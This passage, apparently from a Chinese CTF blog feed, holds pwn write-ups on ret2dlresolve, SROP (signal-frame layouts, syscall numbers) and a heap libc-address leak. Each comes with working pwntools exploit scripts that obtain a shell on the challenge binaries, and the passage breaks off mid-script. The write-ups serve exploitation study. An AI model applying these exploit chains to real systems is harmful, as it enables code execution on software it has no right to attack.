class="line">rop.ret2dlresolve(dlresolve) </span><br><span class="line">raw_rop = rop.chain() </span><br><span class="line">print(rop.dump())</span><br><span class="line">print(hex(dlresolve.data_addr))</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">112</span> </span><br><span class="line">payload += raw_rop </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload= dlresolve.payload</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a></p><p><a href="https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py" target="_blank" rel="noopener">https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统调用与SROP方法学习笔记</title>
      <link href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.<a id="more"></a></p><h2 id="SROP-特点与原理"><a href="#SROP-特点与原理" class="headerlink" title="SROP 特点与原理"></a>SROP 特点与原理</h2><h3 id="SROP-特点"><a href="#SROP-特点" class="headerlink" title="SROP 特点"></a>SROP 特点</h3><p>依赖系统调用(syscal)强但对libc.so的依赖极少。</p><p>要有空间存放Signal Frame的信息.</p><p>与其他rop相比，对的依赖gadgets 较少。</p><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>SROP手段十分依赖signal 机制.而signal 机制是类 unix 系统中进程之间相互传递信息的一种方法，也是我们平常所说的软中断或软信号中断。</p><p>1.内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。<strong>内核会为该进程保存相应的上下文，主要是将所有寄存器以及压入 signal 信息和指向 sigreturn 的系统调用地址压入栈中。</strong>我们称 ucontext 以及 siginfo 这一段为 Signal Frame(此时栈的结构如下图所示)。然后处理signal handler 的事务.<img src="image-20210520224507291.png" alt="image-20210520224507291"></p><p>处理完signal handler 的事务.程序处理完会return回<code>__restore_rt，</code>这个功能里面就是<code>mov rax, 0xf; syscall</code>，去呼叫<code>sys_rt_sigreturn</code>syscall，把一部分恢复Signal Frame通过解析 Signal Frame的信息，将压入的进程还原成中断前的状态。</p><p><img src="image-20210521095432564.png" alt="image-20210521095432564"></p><p>同时,对于signal Frame来说，不同会因为架构的不同而因此有所区别.</p><h4 id="signal-Frame-sigcontext"><a href="#signal-Frame-sigcontext" class="headerlink" title="signal Frame sigcontext"></a>signal Frame sigcontext</h4><p>在32位lunix 下sigcontext 的结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> short gs, __gsh;</span><br><span class="line"><span class="keyword">unsigned</span> short fs, __fsh;</span><br><span class="line"><span class="keyword">unsigned</span> short es, __esh;</span><br><span class="line"><span class="keyword">unsigned</span> short ds, __dsh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line"><span class="keyword">unsigned</span> short cs, __csh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line"><span class="keyword">unsigned</span> short ss, __ssh;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在64位lunix 下sigcontext 的结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">      <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">      <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">      <span class="keyword">unsigned</span> short cs;</span><br><span class="line">      <span class="keyword">unsigned</span> short gs;</span><br><span class="line">      <span class="keyword">unsigned</span> short fs;</span><br><span class="line">      <span class="keyword">unsigned</span> short __pad0;</span><br><span class="line">      <span class="keyword">__uint64_t</span> err;</span><br><span class="line">      <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">      <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">      <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">      __extension__ <span class="keyword">union</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">          <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">        &#125;;</span><br><span class="line">      <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>用图片来形容X64的sigcontext 的结构应该如下表示:</p><p><img src="image-20210521095910046.png" alt="image-20210521095910046"></p><h3 id="SROP-原理"><a href="#SROP-原理" class="headerlink" title="SROP 原理"></a>SROP 原理</h3><p>在程序某一个地方伪造一个<code>signal Frame</code>,再让程序<code>sys_rt_sigreturn</code>我们构造的fake signal Frame.让进程恢复到我们构造的恶意状态.</p><p><img src="image-20210521101741135.png" alt="image-20210521101741135"></p><h2 id="常用系统调用号"><a href="#常用系统调用号" class="headerlink" title="常用系统调用号"></a>常用系统调用号</h2><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><table><thead><tr><th>NR</th><th>syscall name</th><th>%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th></tr></thead><tbody><tr><td>3</td><td>read</td><td>0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>4</td><td>write</td><td>0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>5</td><td>open</td><td>0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td></tr><tr><td>11</td><td>execve</td><td>0x0b</td><td>const char *filename</td><td>char *const *argv</td><td>char *const *envp</td></tr><tr><td>173</td><td>rt_sigreturn</td><td>0xad</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;int execve(const char *pathname, char *const argv[],char *const envp[]);</span><br><span class="line">173i386rt_sigreturnsys_rt_sigreturnstub32_rt_sigreturn</span><br><span class="line">&#x2F;&#x2F; mov  eax 0xad</span><br><span class="line">&#x2F;&#x2F;syscall</span><br><span class="line">&#x2F;&#x2F;retn   Signal Frame addr</span><br></pre></td></tr></table></figure><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><table><thead><tr><th>NR</th><th align="center">syscall name</th><th>%rax</th><th>arg0 (%rdi)</th><th>arg1 (%rsi)</th><th>arg2 (%rdx)</th></tr></thead><tbody><tr><td>0</td><td align="center">read</td><td>0x00</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>1</td><td align="center">write</td><td>0x01</td><td>unsigned int fd</td><td>const char *buf</td><td></td></tr><tr><td>2</td><td align="center">open</td><td>0x02</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td></tr><tr><td>3</td><td align="center">rt_sigreturn</td><td>0x0f</td><td>?</td><td>?</td><td>?</td></tr><tr><td>59</td><td align="center">execve</td><td>0x3b</td><td>const char *filename</td><td>char *const *argv</td><td>char *const *envp</td></tr></tbody></table><h2 id="例题ciscn-s-3"><a href="#例题ciscn-s-3" class="headerlink" title="例题ciscn_s_3"></a>例题ciscn_s_3</h2><p><img src="image-20210521114438090.png" alt="image-20210521114438090"></p><p>这个题目很奇怪,我ida无法F5,然后自己手撕汇编.</p><p><img src="image-20210521115053077.png" alt="image-20210521115053077"></p><p>程序只调用的系统调用而没有调用libc函数.在程序运行的流程中调用系统调用来读入数据到buf,但buf数据只有0x10大小，所以存在栈溢出。然后，接下来调用系统调用来显示数据，但同样存在输出数据范围大于buf于是存在信息泄露。</p><h3 id="解法1-execve与libc-csu-init"><a href="#解法1-execve与libc-csu-init" class="headerlink" title="解法1:execve与libc_csu_init"></a>解法1:execve与libc_csu_init</h3><p>用利用题目中<code>mov     rax, 3Bh;ret</code>gatget来修改rax为0x3b，同时利用libc_csu_init来修改rdx为0，用<code>pop rdi;ret</code>来修改rdi 的值指向<code>/bin/sh</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">rax=<span class="number">0x0000000004004E2</span>  <span class="comment">#mov     rax, 3Bh;ret</span></span><br><span class="line">libc_csu_init_gat1=<span class="number">0x00000000040059A</span></span><br><span class="line">libc_csu_init_gat2=<span class="number">0x000000000400580</span></span><br><span class="line">rdi_ret=<span class="number">0x00000000004005a3</span><span class="comment"># pop rdi;ret</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stack+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_csu_init_gat2)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法2：srop"><a href="#解法2：srop" class="headerlink" title="解法2：srop"></a>解法2：srop</h3><p>同样我们可以利用srop，在栈中部署一个伪造signal Frame sigcontext，然后用rt_sigreturn来恶意恢复重而get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',27681)</span></span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln=<span class="number">0x0000000004004F1</span> <span class="comment">#</span></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line">rax=<span class="number">0x0000000004004DA</span>  <span class="comment">#mov     rax, 0Fh;ret</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(syscall_ret)+str(frame)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank" rel="noopener">系统调用号</a></p><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn堆题泄露libc真实地址小tirck</title>
      <link href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/"/>
      <url>/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/</url>
      
        <content type="html"><![CDATA[<p>在做pwn时,一直烦扰我的是本地打通了,远程打不通的情况。这情况在做堆题时印象最为深刻，因为在做堆题我们往往只能从附件或提示中得到题目环境的libc的大版本，导致我们在计算偏移时会与远程存在差异。因此本文从本地泄露地址讲起，如何避免偏移libc版本地址偏移差异导致功亏一篑。<a id="more"></a></p><h2 id="本地地址泄露方法"><a href="#本地地址泄露方法" class="headerlink" title="本地地址泄露方法"></a>本地地址泄露方法</h2><p>我们以2018-HitCon-Pwn-gundam来分析下，题目保护如下：</p><p><img src="image-20210503234633625.png" alt="image-20210503234633625"></p><blockquote><p>由于linux中使用<code>free()</code>进行内存释放时，不大于 <code>max_fast</code> （默认值为 64B）的 chunk 被释放后，首先会被放到 <code>fast bins</code>中，大于<code>max_fast</code>的chunk或者<code>fast bins</code> 中的空闲 chunk 合并后会被放入<code>unsorted bin</code>中。而在fastbin为空时，<code>unsortbin</code>的fd和bk指向自身<code>main_arena</code>中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出<code>main_arena</code>的实际地址，结合偏移值从而得到libc的加载地址。</p></blockquote><p>所以我们在做堆题时，通常都是我们想办法构造出一个大于0x90的chunk来free掉加入unsorted bin，获得一个在<code>main_arena</code>相近的值从而得到<code>main_arena</code>的真实地址。再通过gdb  vmmap 得到libc的基地址.</p><p><img src="image-20210503232104347.png" alt="image-20210503232104347"></p><p>再继续通过gdb寻找<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址，计算出他们与libc基地址偏移。</p><p><img src="image-20210503232436354.png" alt="image-20210503232436354"></p><p>这样在同一个环境中，就算开了保护 libc.so 动态链接库中的symbols与libc 基地址相对偏移是固定的。我们得到了unsorted bin就可以得到所有我们想要的地址。</p><p><img src="image-20210503234159126.png" alt="image-20210503234159126"></p><p>这样方法写出的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">base=u64(addr)<span class="number">-0x3afca0</span></span><br><span class="line">print(hex(base))</span><br><span class="line">free_hook=base+<span class="number">0x3b18e8</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(base+<span class="number">0x41780</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="减少gdb调试依赖"><a href="#减少gdb调试依赖" class="headerlink" title="减少gdb调试依赖"></a>减少gdb调试依赖</h2><p>但我们这样做有缺陷，我们所有的地址都是通过本地gdb一个一个gdb出来。所有偏移的计算过程，都有本地gdb参与。然不同的libc下，各symbols的偏移是不同。而远程下我们是不能进行gdb调的。但我们发现，libc与<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址的偏移差距不仅固定，而且就是symbols在so文件中地址的差异。</p><p><img src="image-20210504002319132.png" alt="image-20210504002319132"></p><p>这样利用pwntool 中的<code>symbols</code>来获得偏移，从而减少了对gdb调试的依赖。同时，又通过附件中的libc得到了远程环境的相同的偏移。</p><p>这样写法的完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 